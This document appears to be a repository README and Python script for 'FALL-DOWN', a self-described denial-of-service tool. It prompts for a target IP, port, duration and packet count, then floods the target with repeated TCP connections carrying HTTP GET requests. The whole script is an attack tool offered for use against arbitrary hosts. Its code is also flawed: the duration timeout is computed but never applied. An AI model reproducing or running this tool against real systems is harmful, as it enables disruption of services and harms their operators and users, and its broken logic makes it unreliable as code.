# FALL-DOWN
ddos tool by R.S.C
import socket
import time

def print_banner():
    print("""
    ██████  ██████  ██████  ███████     ███████ ██████  ██████   ██████  ██████  
    ██      ██  ████ ██   ██ ██          ██      ██   ██ ██   ██ ██  ████ ██   ██ 
    ██      ██ ██ ██ ██   ██ █████       █████   ██████  ██████  ██ ██ ██ ██████  
    ██      ████  ██ ██   ██ ██          ██      ██   ██ ██   ██ ████  ██ ██   ██ 
     ██████  ██████  ██████  ███████     ███████ ██   ██ ██   ██  ██████  ██   ██ 
                                                                                  
                                                                                      
   A Simple Denial of Service (DoS) Tool by R.S.C                                                                                   
    """)

def dos_attack(ip, port, duration, packets_to_send):
    timeout = time.time() + duration
    packets_sent = 0

    try:
        for _ in range(packets_to_send):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.sendall("GET / HTTP/1.1\r\n".encode())
            s.sendall(("Host: " + ip + "\r\n\r\n").encode())
            packets_sent += 1
            print(f"{packets_sent} packets sent to {ip}")
            s.close()
            time.sleep(0.1)  # Añadimos un pequeño retraso entre envíos para evitar saturar la red

    except socket.error as e:
        print(f"Connection error: {e}")

print_banner()
target_ip = input("Enter the target IP address: ")
target_port = int(input("Enter the target port: "))
duration = int(input("Enter the duration of the attack in seconds: "))
packets_to_send = int(input("Enter the number of packets to send at once: "))

dos_attack(target_ip, target_port, duration, packets_to_send)
